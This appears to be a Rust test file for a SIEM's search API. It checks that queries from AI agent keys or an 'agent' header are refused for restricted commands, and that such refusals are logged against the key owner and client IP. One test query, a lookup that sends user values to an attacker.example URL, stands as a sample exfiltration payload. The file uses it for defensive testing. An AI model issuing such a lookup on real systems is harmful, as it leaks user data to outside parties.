// SPDX-License-Identifier: AGPL-3.0-or-later
//! NAN-5437: API-process search routes (rule test, dashboard panel query)
//! carry the agent class for Desktop agent keys and the `agent` header, so a
//! restricted nPL command is refused there as on the Search service.

use axum::{
    body::Body,
    extract::Request,
    middleware::{self, Next},
    response::IntoResponse,
    routing::post,
    Router,
};
use nanosiem_core::auth::{ApiKeyInfo, TokenClaims};
use nanosiem_core::search::{admission, ai_command_policy};
use tower::ServiceExt;
use uuid::Uuid;

use super::query_class_middleware;
use crate::middleware::AuthContext;

const URL_LOOKUP: &str =
    r#"* | inputlookup url="https://attacker.example/x/{user}" key=user format=json"#;

/// Stands in for the handlers: parse, then the engine's policy hook.
async fn run(body: String) -> axum::response::Response {
    let parsed = nanosiem_core::query::parse_query(&body).expect("test query parses");
    match ai_command_policy::enforce(&body, &parsed, &[], "search") {
        Ok(()) => "ran".into_response(),
        Err(error) => (axum::http::StatusCode::BAD_REQUEST, error.to_string()).into_response(),
    }
}

fn api_key(name: &str) -> AuthContext {
    AuthContext::from_api_key(&ApiKeyInfo {
        id: Uuid::now_v7(),
        name: name.to_string(),
        permissions: vec!["search:execute".to_string()],
        user_id: Some(Uuid::now_v7()),
    })
}

fn session() -> AuthContext {
    AuthContext::from_jwt(TokenClaims {
        sid: None,
        iss: "t".into(),
        aud: "t".into(),
        sub: Uuid::now_v7(),
        roles: vec![],
        permissions: vec!["search:execute".into()],
        exp: i64::MAX,
        iat: 0,
        jti: Uuid::now_v7(),
        purpose: "access".into(),
    })
}

async fn call(path: &str, auth: AuthContext, headers: &[(&str, &str)], query: &str) -> (u16, String) {
    let app = Router::new()
        .route("/api/rules/test", post(run))
        .route("/api/rules/{id}/test", post(run))
        .route("/api/dashboards/panel/query", post(run))
        .layer(middleware::from_fn(query_class_middleware))
        .layer(middleware::from_fn(move |mut request: Request, next: Next| {
            let auth = auth.clone();
            async move {
                request.extensions_mut().insert(auth);
                next.run(request).await
            }
        }));
    let mut request = Request::builder().method("POST").uri(path);
    for (name, value) in headers {
        request = request.header(*name, *value);
    }
    let response = app
        .oneshot(request.body(Body::from(query.to_string())).unwrap())
        .await
        .unwrap();
    let status = response.status().as_u16();
    let body = axum::body::to_bytes(response.into_body(), 1 << 16).await.unwrap();
    (status, String::from_utf8(body.to_vec()).unwrap())
}

const PATHS: [&str; 3] = [
    "/api/rules/test",
    "/api/rules/0190b7a0-0000-7000-8000-000000000000/test",
    "/api/dashboards/panel/query",
];

#[tokio::test]
async fn desktop_agent_key_is_refused_on_api_search_routes() {
    for path in PATHS {
        let (status, body) = call(path, api_key("nano Desktop \u{2014} agent tools (mbp)"), &[], URL_LOOKUP).await;
        assert_eq!(status, 400, "{path}: {body}");
        assert!(body.contains("not available to AI searches"), "{path}: {body}");
        // A header never raises an agent key to human.
        let (status, _) = call(
            path,
            api_key("nano Desktop \u{2014} hunt sweep (mbp)"),
            &[(admission::QUERY_CLASS_HEADER, "human")],
            URL_LOOKUP,
        )
        .await;
        assert_eq!(status, 400, "{path}");
    }
}

#[tokio::test]
async fn agent_header_lowers_any_caller() {
    for path in PATHS {
        let (status, _) =
            call(path, api_key("ci export"), &[(admission::QUERY_CLASS_HEADER, "agent")], URL_LOOKUP).await;
        assert_eq!(status, 400, "{path}");
        let (status, _) = call(path, session(), &[(admission::QUERY_CLASS_HEADER, "agent")], URL_LOOKUP).await;
        assert_eq!(status, 400, "{path}");
    }
}

#[tokio::test]
async fn agent_read_only_search_runs() {
    let (status, body) = call(
        "/api/dashboards/panel/query",
        api_key("nano Desktop \u{2014} agent tools (mbp)"),
        &[],
        "* | stats count by user | table user, count",
    )
    .await;
    assert_eq!((status, body.as_str()), (200, "ran"));
}

#[tokio::test]
async fn human_callers_are_unaffected() {
    for path in PATHS {
        for auth in [session(), api_key("ci export")] {
            let (status, body) = call(path, auth, &[], URL_LOOKUP).await;
            assert_eq!((status, body.as_str()), (200, "ran"), "{path}");
        }
    }
}

/// NAN-5456: a refusal in an API-process search is attributed to the member
/// (the key owner, with the key named) and the client IP the auth layer
/// recorded, never "by system".
#[tokio::test]
async fn refusal_is_attributed_to_the_member_and_client_ip() {
    use nanosiem_core::audit::ClientContext;

    async fn attribution() -> axum::response::Response {
        let caller = ai_command_policy::current_search_audit_caller();
        axum::Json(serde_json::json!({
            "actor": caller.actor_id,
            "key": caller.api_key_id,
            "key_name": caller.api_key_name,
            "ip": caller.client.ip_address,
        }))
        .into_response()
    }

    async fn call_as(auth: AuthContext) -> serde_json::Value {
        let app = Router::new()
            .route("/api/rules/test", post(attribution))
            .layer(middleware::from_fn(query_class_middleware))
            .layer(middleware::from_fn(move |mut request: Request, next: Next| {
                let auth = auth.clone();
                async move {
                    request.extensions_mut().insert(auth);
                    request
                        .extensions_mut()
                        .insert(ClientContext::new(Some("198.51.100.20".into()), None));
                    next.run(request).await
                }
            }));
        let request = Request::builder()
            .method("POST")
            .uri("/api/rules/test")
            .header(admission::QUERY_CLASS_HEADER, "agent")
            .body(Body::empty())
            .unwrap();
        let response = app.oneshot(request).await.unwrap();
        let body = axum::body::to_bytes(response.into_body(), 1 << 16).await.unwrap();
        serde_json::from_slice(&body).unwrap()
    }

    let member = session();
    let seen = call_as(member.clone()).await;
    assert_eq!(seen["actor"], member.user_id().to_string(), "{seen}");
    assert_eq!(seen["ip"], "198.51.100.20", "{seen}");
    assert!(seen["key"].is_null(), "{seen}");

    let key = api_key("ci export");
    let seen = call_as(key.clone()).await;
    assert_eq!(seen["actor"], key.user_id().to_string(), "the key owner: {seen}");
    assert_eq!(seen["key"], key.api_key_id.unwrap().to_string(), "{seen}");
    assert_eq!(seen["key_name"], "ci export", "{seen}");
    assert_eq!(seen["ip"], "198.51.100.20", "{seen}");
}
